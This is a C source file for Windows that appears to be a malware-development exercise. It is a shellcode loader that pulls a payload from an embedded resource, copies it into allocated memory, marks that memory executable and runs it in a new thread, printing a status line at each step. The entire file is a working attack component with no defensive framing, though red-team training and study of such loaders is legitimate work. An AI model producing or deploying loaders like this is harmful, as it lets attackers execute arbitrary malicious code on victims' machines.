#include <windows.h>
#include <stdio.h>
#include "resource.h"

int main () {
    void *exec_mem;
    BOOL rv;
    HANDLE th;
    DWORD oldprotect = 0;

    HRSRC res = FindResource(NULL, MAKEINTRESOURCE(IDR_PAYLOAD), RT_RCDATA); // Find the resource
    if (res == NULL) {
        printf("[!] Find resource failed !\n");
        return 1;
    }
    printf("[+] Find resource success !\n");

    HGLOBAL res_data = LoadResource(NULL, res); // Load the resource
    if (res_data == NULL) {
        printf("[!] Load resource failed !\n");
        return 1;
    }
    printf("[+] Load resource success !\n");

    LPVOID payload = LockResource(res_data); // Lock the resource
    if (payload == NULL){
        printf("[!] Lock resource failed !\n");
        return 1;
    }
    printf("[+] Lock resource success !\n");

    DWORD payload_size = SizeofResource(NULL, res); // Get the size of the resource
    printf("[+] Payload size: %d bytes\n", payload_size);


    exec_mem = VirtualAlloc(0, payload_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE); // Return memory address that reserve in RAM
    if (exec_mem == NULL) {
        printf("[!] VirtualAlloc failed !\n");
        return 1;
    }
    printf("[+] VirtualAlloc success !\n");

    RtlMoveMemory(exec_mem, payload, payload_size); // Copy Payload to the memory address
    printf("[+] Payload copied to memory !\n");

    rv = VirtualProtect(exec_mem, payload_size, PAGE_EXECUTE_READ, &oldprotect); // Re-purpose mem address to execute
    if (!rv) {
        printf("[!] VirtualProtect failed !\n");
        return 1;
    }
    printf("[+] VirtualProtect success !\n");

    th = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)exec_mem, 0, 0, 0); // Create a thread to execute the payload
    if (th == NULL) {
        printf("[!] CreateThread failed !\n");
        return 1;
    }
    printf("[+] CreateThread success !\n");

    WaitForSingleObject(th, -1); // Wait for the thread to finish

    return 0;
}